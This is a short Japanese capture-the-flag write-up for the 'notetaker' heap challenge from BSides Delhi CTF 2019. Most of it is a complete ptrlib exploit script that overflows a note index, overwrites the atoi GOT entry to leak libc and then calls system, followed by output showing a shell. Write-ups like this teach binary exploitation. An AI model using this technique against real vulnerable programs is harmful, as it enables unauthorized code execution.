# [pwn ???pts] notetaker - BSides Dehli CTF 2019
64ビットでPIEやRELROは無効です。
```
$ checksec -f notetaker
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   87 Symbols     Yes      0               4       notetaker
```
ヒープ問です。タイトルとサイズを保存する領域があるのですが、addでインデックスが12のタイトルを作れるのでsize[0]を上書きしてしまいます。したがって、ヒープオーバーフローがあります。PIEとRELROが無効なのでatoiとprintfにしていろいろリークして、atoiをsystemに書き換えれば終わりです。

```python
from ptrlib import *

def add(title_size, title, desc_size, desc):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(title_size))
    sock.sendafter(": ", title)
    sock.sendlineafter(": ", str(desc_size))
    sock.sendafter(": ", desc)
    return

def edit(index, title, desc):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendafter(": ", title)
    sock.sendafter(": ", desc)
    return

def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(index))
    return

elf = ELF("./notetaker")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./notetaker")
#libc = ELF("./libc.so.6")
#sock = Socket("localhost", 9999)

# libc leak
for i in range(12):
    add(0x10, "A", 0x60, "B")
add(0x10, "B", 0x60, "B") # this will make size[1] very big
edit(1, b"A"*0x20 + p64(elf.got('atoi')) + p64(0x10), p64(elf.plt('printf')) + b'\x00')
sock.sendafter("> ", "%3$p\n\n")
libc_base = int(sock.recvline(), 16) - libc.symbol("read") - 17
print("libc base = " + hex(libc_base))

# got overwrite
sock.sendlineafter("> ", "AA") # edit
sock.sendlineafter(": ", "A")
sock.sendafter(": ", b"A"*0x20 + p64(elf.got('atoi')) + p64(0x10))
sock.sendafter(": ", p64(libc_base + libc.symbol("system")) + b'\x00')

sock.interactive()
```
ほい。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=29637)
libc base = 0x7f162be3d000
[ptrlib]$ 1. Add note
2. Edit note
3. Show note
4. Delete note
Your Choice > id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
Invalid!
1. Add note
2. Edit note
3. Show note
4. Delete note
Your Choice > [ptrlib]$
```

# 感想
面白かったです。
